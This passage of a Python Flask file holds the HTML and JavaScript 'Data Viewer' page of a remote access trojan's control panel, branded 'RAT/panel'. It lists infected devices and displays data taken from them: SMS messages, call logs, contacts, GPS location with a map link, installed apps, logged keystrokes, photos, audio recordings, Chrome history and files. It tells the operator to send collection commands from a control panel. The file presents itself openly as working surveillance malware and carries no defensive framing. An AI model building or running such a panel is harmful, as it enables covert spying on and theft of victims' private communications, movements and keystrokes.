        .nav-link { display:flex; align-items:center; gap:6px; padding:0 16px; height:52px; font-size:.82rem; font-weight:500; color:var(--text-dim); text-decoration:none; border-bottom:2px solid transparent; transition:all .2s; }
        .nav-link:hover { color:var(--text); }
        .nav-link.active { color:var(--green); border-bottom-color:var(--green); }
        .nav-spacer { flex:1; }
        .nav-badge { background:var(--bg3); border:1px solid var(--border); border-radius:20px; padding:2px 10px; font-size:.7rem; font-family:'JetBrains Mono', monospace; color:var(--text-dim); }
        .dot-anim { width:6px;height:6px;border-radius:50%;background:var(--green); display:inline-block;margin-right:5px;animation:pulse 2s infinite; }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.3} }

        /* ── LAYOUT ── */
        .page-body { display:flex; flex:1; overflow:hidden; height:calc(100vh - 52px); }

        /* ── SIDEBAR ── */
        .sidebar {
            width:240px; flex-shrink:0; background:var(--bg2);
            border-right:1px solid var(--border); display:flex; flex-direction:column;
            overflow-y:auto;
        }
        .sidebar-header { padding:16px 16px 8px; }
        .sidebar-header h3 { font-size:.7rem; font-weight:700; letter-spacing:2px; text-transform:uppercase; color:var(--text-dim); }
        .device-select {
            width:100%; margin-top:10px; padding:7px 10px;
            background:var(--bg3); color:var(--text); border:1px solid var(--border);
            border-radius:6px; font-size:.75rem; font-family:'Inter', sans-serif;
            cursor:pointer; outline:none;
        }
        .device-select:focus { border-color:var(--cyan); }
        .sidebar-sep { height:1px; background:var(--border); margin:10px 0; }
        .cat-label { padding:4px 16px; font-size:.62rem; font-weight:700; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); }
        .cat-btn {
            display:flex; align-items:center; gap:10px; padding:9px 16px;
            cursor:pointer; font-size:.8rem; color:var(--text-dim);
            border-left:3px solid transparent; transition:all .15s;
            border:none; background:none; width:100%; text-align:left;
        }
        .cat-btn:hover { background:var(--bg3); color:var(--text); }
        .cat-btn.active { color:var(--text); border-left-color:var(--green); background:rgba(57,255,20,.06); }
        .cat-icon { font-size:1rem; flex-shrink:0; }
        .cat-name { flex:1; }
        .cat-count {
            min-width:22px; height:18px; display:flex; align-items:center; justify-content:center;
            background:var(--bg4); border:1px solid var(--border); border-radius:10px;
            font-size:.62rem; font-family:'JetBrains Mono', monospace; color:var(--text-dim);
        }
        .sidebar-footer { padding:12px 16px; margin-top:auto; }
        .refresh-toggle { display:flex; align-items:center; gap:8px; font-size:.72rem; color:var(--text-dim); cursor:pointer; }
        .toggle-switch { position:relative; width:32px; height:18px; }
        .toggle-switch input { opacity:0; width:0; height:0; }
        .toggle-slider { position:absolute; inset:0; background:var(--bg4); border-radius:9px; border:1px solid var(--border); transition:.2s; cursor:pointer; }
        .toggle-slider::before { content:''; position:absolute; width:12px; height:12px; left:2px; top:2px; background:var(--text-dim); border-radius:50%; transition:.2s; }
        input:checked + .toggle-slider { background:var(--green-dim); border-color:var(--green); }
        input:checked + .toggle-slider::before { transform:translateX(14px); background:var(--green); }

        /* ── MAIN CONTENT ── */
        .main { flex:1; display:flex; flex-direction:column; overflow:hidden; }

        /* ── CONTENT HEADER ── */
        .content-header {
            padding:16px 20px; background:var(--bg2); border-bottom:1px solid var(--border);
            display:flex; align-items:center; gap:12px; flex-shrink:0; flex-wrap:wrap;
        }
        .content-title { font-weight:600; font-size:1rem; display:flex; align-items:center; gap:8px; }
        .content-icon { font-size:1.2rem; }
        .content-count { font-family:'JetBrains Mono', monospace; font-size:.72rem; color:var(--text-dim); }
        .header-spacer { flex:1; }
        .search-box {
            padding:6px 12px; background:var(--bg3); color:var(--text);
            border:1px solid var(--border); border-radius:6px; font-size:.75rem;
            font-family:'Inter', sans-serif; outline:none; width:200px; transition:border-color .2s;
        }
        .search-box:focus { border-color:var(--cyan); }
        .clear-btn {
            padding:6px 12px; background:var(--bg3); color:var(--red);
            border:1px solid var(--border); border-radius:6px; cursor:pointer;
            font-size:.72rem; transition:all .15s;
        }
        .clear-btn:hover { border-color:var(--red); background:rgba(248,81,73,.08); }

        /* ── DATA LIST ── */
        .data-scroll { flex:1; overflow-y:auto; padding:16px 20px; }

        /* ── RECORD CARD ── */
        .record-card {
            background:var(--bg2); border:1px solid var(--border);
            border-radius:var(--radius); margin-bottom:10px;
            overflow:hidden; transition:border-color .15s; cursor:pointer;
        }
        .record-card:hover { border-color:var(--border2); }
        .record-card.expanded { border-color:var(--cyan); }
        .record-header {
            display:flex; align-items:center; gap:10px; padding:11px 14px;
        }
        .record-cat-dot { width:8px; height:8px; border-radius:50%; flex-shrink:0; }
        .record-cmd { font-family:'JetBrains Mono', monospace; font-size:.72rem; font-weight:600; }
        .record-device { font-size:.7rem; color:var(--text-dim); }
        .record-time { margin-left:auto; font-family:'JetBrains Mono', monospace; font-size:.68rem; color:var(--text-dim); white-space:nowrap; }
        .record-file-badge {
            padding:1px 7px; border-radius:10px;
            background:rgba(227,179,65,.12); color:var(--yellow);
            border:1px solid rgba(227,179,65,.25); font-size:.62rem; flex-shrink:0;
        }
        .record-toggle { color:var(--text-dim); font-size:.75rem; flex-shrink:0; transition:transform .2s; }
        .record-card.expanded .record-toggle { transform:rotate(180deg); }

        /* ── RECORD BODY ── */
        .record-body { display:none; border-top:1px solid var(--border); }
        .record-card.expanded .record-body { display:block; }
        .record-body-inner { padding:14px; }
        .record-actions { display:flex; gap:6px; flex-wrap:wrap; margin-bottom:12px; }
        .action-btn {
            padding:5px 12px; background:var(--bg3); color:var(--text-dim);
            border:1px solid var(--border); border-radius:5px; cursor:pointer;
            font-size:.7rem; font-family:'JetBrains Mono', monospace; transition:all .15s;
        }
        .action-btn:hover { color:var(--green); border-color:var(--green-dim); }
        .action-btn.primary:hover { color:var(--cyan); border-color:var(--cyan); }
        .data-preview {
            background:var(--bg); border:1px solid var(--border); border-radius:5px;
            padding:12px; max-height:360px; overflow-y:auto;
            font-family:'JetBrains Mono', monospace; font-size:.72rem; line-height:1.7;
        }

        /* ── Specialised renderers ── */
        .table-view { width:100%; border-collapse:collapse; font-size:.73rem; }
        .table-view th { text-align:left; padding:6px 10px; color:var(--text-dim); font-weight:600; border-bottom:1px solid var(--border); font-size:.65rem; text-transform:uppercase; letter-spacing:.5px; }
        .table-view td { padding:7px 10px; border-bottom:1px solid var(--border); color:var(--text); vertical-align:top; }
        .table-view tr:last-child td { border-bottom:none; }
        .table-view tr:hover td { background:var(--bg3); }
        .table-val-mono { font-family:'JetBrains Mono', monospace; font-size:.7rem; color:var(--cyan); }

        /* ── EMPTY STATE ── */
        .empty-state { text-align:center; padding:60px 20px; color:var(--text-dim); }
        .empty-state .empty-icon { font-size:3rem; margin-bottom:12px; }
        .empty-state h3 { font-size:.9rem; margin-bottom:6px; }
        .empty-state p { font-size:.78rem; }

        /* ── TOAST ── */
        .toast { position:fixed; top:20px; right:20px; padding:10px 18px; border-radius:6px; font-size:.78rem; z-index:9999; font-family:'JetBrains Mono', monospace; animation:fadeIn .2s ease; }
        @keyframes fadeIn { from{opacity:0;transform:translateY(-6px)} to{opacity:1;transform:none} }
        .toast.success { background:#1a3d14; color:var(--green); border:1px solid var(--green-dim); }
        .toast.error   { background:#3d1414; color:var(--red); border:1px solid #7a2020; }

        ::-webkit-scrollbar { width:6px; }
        ::-webkit-scrollbar-track { background:var(--bg); }
        ::-webkit-scrollbar-thumb { background:#30363d; border-radius:3px; }

        /* media */
        .media-preview { max-width:100%; max-height:300px; border-radius:6px; border:1px solid var(--border); margin-top:8px; }
        .audio-player  { width:100%; margin-top:8px; }
    </style>
</head>
<body>
    <!-- NAV -->
    <nav class="topnav">
        <div class="brand">⚡ RAT<span>/panel</span></div>
        <a class="nav-link" href="/">🖥️ Control Panel</a>
        <a class="nav-link active" href="/data">📊 Data Viewer</a>
        <div class="nav-spacer"></div>
        <div class="nav-badge"><span class="dot-anim"></span><span id="navOnline">0</span> online</div>
    </nav>

    <div class="page-body">
        <!-- SIDEBAR -->
        <div class="sidebar">
            <div class="sidebar-header">
                <h3>Filter</h3>
                <select class="device-select" id="deviceFilter" onchange="loadData()">
                    <option value="all">All Devices</option>
                </select>
            </div>
            <div class="sidebar-sep"></div>
            <div class="cat-label">Categories</div>
            <button class="cat-btn active" id="cat-all" onclick="selectCategory('all')">
                <span class="cat-icon">📋</span>
                <span class="cat-name">All Data</span>
                <span class="cat-count" id="cnt-all">0</span>
            </button>
            <button class="cat-btn" id="cat-sms" onclick="selectCategory('sms')">
                <span class="cat-icon">💬</span>
                <span class="cat-name">SMS Inbox</span>
                <span class="cat-count" id="cnt-sms">0</span>
            </button>
            <button class="cat-btn" id="cat-call_logs" onclick="selectCategory('call_logs')">
                <span class="cat-icon">📞</span>
                <span class="cat-name">Call Logs</span>
                <span class="cat-count" id="cnt-call_logs">0</span>
            </button>
            <button class="cat-btn" id="cat-contacts" onclick="selectCategory('contacts')">
                <span class="cat-icon">👤</span>
                <span class="cat-name">Contacts</span>
                <span class="cat-count" id="cnt-contacts">0</span>
            </button>
            <button class="cat-btn" id="cat-location" onclick="selectCategory('location')">
                <span class="cat-icon">📍</span>
                <span class="cat-name">Location</span>
                <span class="cat-count" id="cnt-location">0</span>
            </button>
            <button class="cat-btn" id="cat-apps" onclick="selectCategory('apps')">
                <span class="cat-icon">📦</span>
                <span class="cat-name">Installed Apps</span>
                <span class="cat-count" id="cnt-apps">0</span>
            </button>
            <button class="cat-btn" id="cat-keystrokes" onclick="selectCategory('keystrokes')">
                <span class="cat-icon">⌨️</span>
                <span class="cat-name">Keystrokes</span>
                <span class="cat-count" id="cnt-keystrokes">0</span>
            </button>
            <button class="cat-btn" id="cat-photos" onclick="selectCategory('photos')">
                <span class="cat-icon">📸</span>
                <span class="cat-name">Photos</span>
                <span class="cat-count" id="cnt-photos">0</span>
            </button>
            <button class="cat-btn" id="cat-audio" onclick="selectCategory('audio')">
                <span class="cat-icon">🎵</span>
                <span class="cat-name">Audio</span>
                <span class="cat-count" id="cnt-audio">0</span>
            </button>
            <button class="cat-btn" id="cat-chrome_history" onclick="selectCategory('chrome_history')">
                <span class="cat-icon">🌐</span>
                <span class="cat-name">Chrome History</span>
                <span class="cat-count" id="cnt-chrome_history">0</span>
            </button>
            <button class="cat-btn" id="cat-files" onclick="selectCategory('files')">
                <span class="cat-icon">📁</span>
                <span class="cat-name">Files</span>
                <span class="cat-count" id="cnt-files">0</span>
            </button>
            <button class="cat-btn" id="cat-system" onclick="selectCategory('system')">
                <span class="cat-icon">⚙️</span>
                <span class="cat-name">System</span>
                <span class="cat-count" id="cnt-system">0</span>
            </button>
            <button class="cat-btn" id="cat-other" onclick="selectCategory('other')">
                <span class="cat-icon">📋</span>
                <span class="cat-name">Other</span>
                <span class="cat-count" id="cnt-other">0</span>
            </button>

            <div class="sidebar-footer">
                <label class="refresh-toggle">
                    <div class="toggle-switch">
                        <input type="checkbox" id="autoRefresh" onchange="toggleAutoRefresh()" checked>
                        <span class="toggle-slider"></span>
                    </div>
                    Auto-refresh
                </label>
            </div>
        </div>

        <!-- MAIN -->
        <div class="main">
            <div class="content-header">
                <div class="content-title">
                    <span class="content-icon" id="hdrIcon">📋</span>
                    <span id="hdrTitle">All Data</span>
                </div>
                <span class="content-count" id="hdrCount">0 records</span>
                <div class="header-spacer"></div>
                <input class="search-box" type="text" id="searchBox" placeholder="Search records…" oninput="renderCards()">
                <button class="clear-btn" onclick="clearSearch()">✕ Clear</button>
            </div>

            <div class="data-scroll" id="dataScroll">
                <div class="empty-state">
                    <div class="empty-icon">📭</div>
                    <h3>No data yet</h3>
                    <p>Send commands from the <a href="/" style="color:var(--cyan)">Control Panel</a> to collect data.</p>
                </div>
            </div>
        </div>
    </div>

    <div id="toastContainer"></div>

    <script>
        var allRecords   = [];
        var currentCat   = 'all';
        var autoRefreshTimer = null;

        var catColors = {
            sms:'#4ade80', call_logs:'#60a5fa', contacts:'#a78bfa',
            location:'#f87171', apps:'#fb923c', keystrokes:'#facc15',
            photos:'#34d399', audio:'#f472b6', chrome_history:'#38bdf8',
            files:'#fbbf24', system:'#94a3b8', other:'#6b7280'
        };

        var catIcons = {
            sms:'💬', call_logs:'📞', contacts:'👤', location:'📍',
            apps:'📦', keystrokes:'⌨️', photos:'📸', audio:'🎵',
            chrome_history:'🌐', files:'📁', system:'⚙️', other:'📋', all:'📋'
        };

        var catTitles = {
            sms:'SMS Inbox', call_logs:'Call Logs', contacts:'Contacts',
            location:'Location', apps:'Installed Apps', keystrokes:'Keystrokes',
            photos:'Photos', audio:'Audio', chrome_history:'Chrome History',
            files:'Files', system:'System', other:'Other', all:'All Data'
        };

        // ── init ──
        function init() {
            loadDevices();
            loadData();
        }

        function toast(msg, type) {
            var t = document.createElement('div');
            t.className = 'toast ' + type;
            t.textContent = msg;
            document.getElementById('toastContainer').appendChild(t);
            setTimeout(function() { t.remove(); }, 3000);
        }

        function clearSearch() {
            document.getElementById('searchBox').value = '';
            renderCards();
        }

        // ── devices ──
        function loadDevices() {
            fetch('/api/devices')
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    document.getElementById('navOnline').textContent = data.online || 0;
                    var sel = document.getElementById('deviceFilter');
                    var prev = sel.value;
                    sel.innerHTML = '<option value="all">All Devices</option>';
                    (data.devices || []).forEach(function(d) {
                        var o = document.createElement('option');
                        o.value = d.device_id;
                        o.textContent = d.device_id + (d.online ? ' ●' : ' ○');
                        sel.appendChild(o);
                    });
                    sel.value = prev;
                });
        }

        // ── category selection ──
        function selectCategory(cat) {
            currentCat = cat;
            document.querySelectorAll('.cat-btn').forEach(function(b) { b.classList.remove('active'); });
            var btn = document.getElementById('cat-' + cat);
            if (btn) btn.classList.add('active');
            document.getElementById('hdrTitle').textContent = catTitles[cat] || cat;
            document.getElementById('hdrIcon').textContent  = catIcons[cat]  || '📋';
            loadData();
        }

        // ── load data ──
        function loadData() {
            var dev = document.getElementById('deviceFilter').value;
            fetch('/api/data?category=' + currentCat + '&device_id=' + dev)
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    allRecords = data.results || [];

                    // update counts
                    var counts = data.counts || {};
                    var total  = 0;
                    Object.keys(counts).forEach(function(k) { total += counts[k]; });
                    document.getElementById('cnt-all').textContent = total;
                    ['sms','call_logs','contacts','location','apps','keystrokes',
                     'photos','audio','chrome_history','files','system','other'].forEach(function(k) {
                        var el = document.getElementById('cnt-' + k);
                        if (el) el.textContent = counts[k] || 0;
                    });

                    renderCards();
                })
                .catch(function() {});
        }

        // ── render ──
        function renderCards() {
            var query   = (document.getElementById('searchBox').value || '').toLowerCase();
            var records = allRecords;

            if (query) {
                records = records.filter(function(r) {
                    return JSON.stringify(r).toLowerCase().indexOf(query) !== -1;
                });
            }

            document.getElementById('hdrCount').textContent = records.length + ' record' + (records.length !== 1 ? 's' : '');

            var scroll = document.getElementById('dataScroll');
            if (!records.length) {
                scroll.innerHTML = '<div class="empty-state"><div class="empty-icon">' +
                    (catIcons[currentCat] || '📭') +
                    '</div><h3>No ' + (catTitles[currentCat] || 'data') + ' found</h3>' +
                    '<p>Send a command from the <a href="/" style="color:var(--cyan)">Control Panel</a> to collect this data.</p></div>';
                return;
            }

            var html = '';
            records.forEach(function(r, idx) {
                var color  = catColors[r.category] || '#6b7280';
                var ts     = (r.timestamp || '').substring(0, 19).replace('T', ' ');
                html += '<div class="record-card" id="rc-' + idx + '" onclick="toggleCard(' + idx + ')">';
                html += '<div class="record-header">';
                html += '<span class="record-cat-dot" style="background:' + color + ';box-shadow:0 0 6px ' + color + '40"></span>';
                html += '<span class="record-cmd">' + r.command + '</span>';
                html += '<span class="record-device">' + r.device_id + '</span>';
                if (r.has_file) html += '<span class="record-file-badge">📎 file</span>';
                html += '<span class="record-time">' + ts + '</span>';
                html += '<span class="record-toggle">▼</span>';
                html += '</div>';
                html += '<div class="record-body"><div class="record-body-inner">';
                html += '<div class="record-actions">';
                html += '<button class="action-btn" onclick="event.stopPropagation();copyJson(' + idx + ')">📋 Copy JSON</button>';
                if (r.has_file) {
                    html += '<button class="action-btn primary" onclick="event.stopPropagation();viewMedia(\'' + r.cmd_id + '\',\'' + r.category + '\')">👁 View</button>';
                    html += '<button class="action-btn" onclick="event.stopPropagation();window.open(\'/api/file/' + r.cmd_id + '?mode=raw\',\'_blank\')">⬇ Download</button>';
                }
                html += '</div>';
                html += renderDataBody(r);
                html += '</div></div></div>';
            });
            scroll.innerHTML = html;
        }

        function toggleCard(idx) {
            var card = document.getElementById('rc-' + idx);
            card.classList.toggle('expanded');
        }

        function copyJson(idx) {
            var r = allRecords[idx];
            navigator.clipboard.writeText(JSON.stringify(r.data, null, 2))
                .then(function() { toast('JSON copied!', 'success'); });
        }

        // ── specialised body renderers ──
        function renderDataBody(r) {
            var data = r.data;
            var cat  = r.category;

            try {
                if (cat === 'sms' && data && data.messages) return renderSMS(data.messages);
                if (cat === 'call_logs' && data && data.calls) return renderCallLogs(data.calls);
                if (cat === 'contacts' && data && data.contacts) return renderContacts(data.contacts);
                if (cat === 'location' && data) return renderLocation(data);
                if (cat === 'apps' && data && data.apps) return renderApps(data.apps);
                if (cat === 'keystrokes' && data && data.keystrokes) return renderKeystrokes(data.keystrokes);
                if (cat === 'chrome_history' && data && data.history) return renderChromeHistory(data.history);
                if (cat === 'photos' || cat === 'audio') return renderMediaInfo(r);
            } catch(e) {}

            return '<div class="data-preview">' + escHtml(JSON.stringify(data, null, 2)) + '</div>';
        }

        function renderSMS(messages) {
            if (!messages || !messages.length) return '<p style="color:var(--text-dim);font-size:.75rem;">No messages.</p>';
            var html = '<table class="table-view"><tr><th>From / To</th><th>Date</th><th>Message</th><th>Type</th></tr>';
            messages.slice(0, 50).forEach(function(m) {
                html += '<tr><td class="table-val-mono">' + esc(m.address||m.number||'—') + '</td>' +
                    '<td style="white-space:nowrap;color:var(--text-dim)">' + esc(m.date||m.timestamp||'—') + '</td>' +
                    '<td>' + esc(m.body||m.message||'—') + '</td>' +
                    '<td><span style="color:' + (m.type===1||m.direction==='received'?'#4ade80':'#60a5fa') + '">' + esc(m.type_label||m.direction||(m.type===1?'IN':'OUT')) + '</span></td></tr>';
            });
            html += '</table>';
            if (messages.length > 50) html += '<p style="color:var(--text-dim);font-size:.7rem;padding:6px 0">… and ' + (messages.length-50) + ' more</p>';
            return html;
        }

        function renderCallLogs(calls) {
            if (!calls || !calls.length) return '<p style="color:var(--text-dim);font-size:.75rem;">No calls.</p>';
            var html = '<table class="table-view"><tr><th>Number</th><th>Name</th><th>Date</th><th>Duration</th><th>Type</th></tr>';
            calls.slice(0, 50).forEach(function(c) {
                var dur = c.duration ? Math.floor(c.duration/60) + 'm ' + (c.duration%60) + 's' : '—';
                html += '<tr><td class="table-val-mono">' + esc(c.number||c.address||'—') + '</td>' +
                    '<td>' + esc(c.name||'—') + '</td>' +
                    '<td style="white-space:nowrap;color:var(--text-dim)">' + esc(c.date||c.timestamp||'—') + '</td>' +
                    '<td class="table-val-mono">' + dur + '</td>' +
                    '<td>' + esc(c.call_type||c.type||'—') + '</td></tr>';
            });
            html += '</table>';
            if (calls.length > 50) html += '<p style="color:var(--text-dim);font-size:.7rem;padding:6px 0">… and ' + (calls.length-50) + ' more</p>';
            return html;
        }

        function renderContacts(contacts) {
            if (!contacts || !contacts.length) return '<p style="color:var(--text-dim);font-size:.75rem;">No contacts.</p>';
            var html = '<table class="table-view"><tr><th>Name</th><th>Phone</th><th>Email</th></tr>';
            contacts.slice(0, 80).forEach(function(c) {
                html += '<tr><td><strong>' + esc(c.name||'—') + '</strong></td>' +
                    '<td class="table-val-mono">' + esc(Array.isArray(c.phones)?c.phones.join(', '):(c.phone||'—')) + '</td>' +
                    '<td style="color:var(--text-dim)">' + esc(Array.isArray(c.emails)?c.emails.join(', '):(c.email||'—')) + '</td></tr>';
            });
            html += '</table>';
            if (contacts.length > 80) html += '<p style="color:var(--text-dim);font-size:.7rem;padding:6px 0">… and ' + (contacts.length-80) + ' more</p>';
            return html;
        }

        function renderLocation(data) {
            var lat = data.latitude || data.lat || '—';
            var lng = data.longitude || data.lng || data.lon || '—';
            var acc = data.accuracy ? data.accuracy.toFixed(1) + 'm' : '—';
            var html = '<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px;">';
            html += '<div style="background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:12px;">';
            html += '<div style="color:var(--text-dim);font-size:.65rem;text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;">Latitude</div>';
            html += '<div style="font-family:\'JetBrains Mono\',monospace;color:var(--red);font-size:.85rem;">' + lat + '</div></div>';
            html += '<div style="background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:12px;">';
            html += '<div style="color:var(--text-dim);font-size:.65rem;text-transform:uppercase;letter-spacing:1px;margin-bottom:4px;">Longitude</div>';
            html += '<div style="font-family:\'JetBrains Mono\',monospace;color:var(--red);font-size:.85rem;">' + lng + '</div></div>';
            html += '</div>';
            html += '<p style="font-size:.72rem;color:var(--text-dim);margin-bottom:8px;">Accuracy: ' + acc + '</p>';
            if (lat !== '—' && lng !== '—') {
                var mapsUrl = 'https://maps.google.com/?q=' + lat + ',' + lng;
                html += '<a href="' + mapsUrl + '" target="_blank" style="display:inline-block;padding:6px 14px;background:rgba(248,81,73,.12);color:var(--red);border:1px solid rgba(248,81,73,.3);border-radius:5px;font-size:.72rem;text-decoration:none;">📍 Open in Google Maps</a>';
            }
            return html;
        }

        function renderApps(apps) {
            if (!apps || !apps.length) return '<p style="color:var(--text-dim);font-size:.75rem;">No apps.</p>';
            var html = '<table class="table-view"><tr><th>App Name</th><th>Package</th><th>Version</th></tr>';
            apps.slice(0, 100).forEach(function(a) {
                html += '<tr><td><strong>' + esc(a.name||a.appName||'—') + '</strong></td>' +
                    '<td class="table-val-mono" style="font-size:.65rem;color:var(--text-dim)">' + esc(a.package||a.packageName||'—') + '</td>' +
                    '<td class="table-val-mono">' + esc(a.version||a.versionName||'—') + '</td></tr>';
            });
            html += '</table>';
            if (apps.length > 100) html += '<p style="color:var(--text-dim);font-size:.7rem;padding:6px 0">… and ' + (apps.length-100) + ' more</p>';
            return html;
        }

        function renderKeystrokes(keystrokes) {
            if (!keystrokes || !keystrokes.length) return '<p style="color:var(--text-dim);font-size:.75rem;">No keystrokes.</p>';
            var html = '<table class="table-view"><tr><th>App</th><th>Text</th><th>Time</th></tr>';
            keystrokes.slice(0, 50).forEach(function(k) {
                html += '<tr><td style="color:var(--yellow)">' + esc(k.app||k.package||'—') + '</td>' +
                    '<td style="font-family:\'JetBrains Mono\',monospace">' + esc(k.text||k.key||'—') + '</td>' +
                    '<td style="color:var(--text-dim);white-space:nowrap">' + esc(k.timestamp||k.time||'—') + '</td></tr>';
            });
            html += '</table>';
            if (keystrokes.length > 50) html += '<p style="color:var(--text-dim);font-size:.7rem;padding:6px 0">… and ' + (keystrokes.length-50) + ' more</p>';
            return html;
        }

        function renderChromeHistory(history) {
            if (!history || !history.length) return '<p style="color:var(--text-dim);font-size:.75rem;">No history.</p>';
            var html = '<table class="table-view"><tr><th>Title</th><th>URL</th><th>Visited</th></tr>';
            history.slice(0, 60).forEach(function(h) {
                html += '<tr><td>' + esc(h.title||'—') + '</td>' +
                    '<td style="max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">' +
                    '<a href="' + esc(h.url||'#') + '" target="_blank" style="color:var(--cyan);text-decoration:none">' + esc(h.url||'—') + '</a></td>' +
                    '<td style="color:var(--text-dim);white-space:nowrap">' + esc(h.date||h.timestamp||h.last_visit_time||'—') + '</td></tr>';
            });
            html += '</table>';
            if (history.length > 60) html += '<p style="color:var(--text-dim);font-size:.7rem;padding:6px 0">… and ' + (history.length-60) + ' more</p>';
            return html;
        }

        function renderMediaInfo(r) {
            return '<div style="padding:4px 0;">' +
                '<p style="font-size:.75rem;color:var(--text-dim);margin-bottom:8px;">Media file captured. Use the buttons above to view or download.</p>' +
                '<div id="media-' + r.cmd_id + '"></div>' +
                '</div>';
        }

        function viewMedia(cmdId, category) {
            var divId = 'media-' + cmdId;
            var pDiv  = document.getElementById(divId);
            if (!pDiv) return;
            fetch('/api/file/' + cmdId + '?mode=base64')
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    if (category === 'photos' || data.mime_type.indexOf('image/') === 0)
                        pDiv.innerHTML = '<img class="media-preview" src="data:' + data.mime_type + ';base64,' + data.base64_data + '" alt="Photo">';
                    else if (category === 'audio' || data.mime_type.indexOf('audio/') === 0)
                        pDiv.innerHTML = '<audio class="audio-player" controls src="data:' + data.mime_type + ';base64,' + data.base64_data + '"></audio>';
                    else
                        toast('Unsupported media type: ' + data.mime_type, 'error');
                })
                .catch(function() { toast('Failed to load file', 'error'); });
        }

        // ── auto refresh ──
        function toggleAutoRefresh() {
            if (autoRefreshTimer) { clearInterval(autoRefreshTimer); autoRefreshTimer = null; }
            if (document.getElementById('autoRefresh').checked) {
                autoRefreshTimer = setInterval(function() { loadDevices(); loadData(); }, 8000);
            }
        }

        // ── helpers ──
        function esc(s) {
            if (s === null || s === undefined) return '—';
            return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
        }
        function escHtml(s) { return esc(s); }

        // ── boot ──
        init();
        toggleAutoRefresh();  // start auto-refresh
    </script>
</body>
</html>
'''

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    print(f"[*] Starting server on port {port}")
    app.run(host='0.0.0.0', port=port)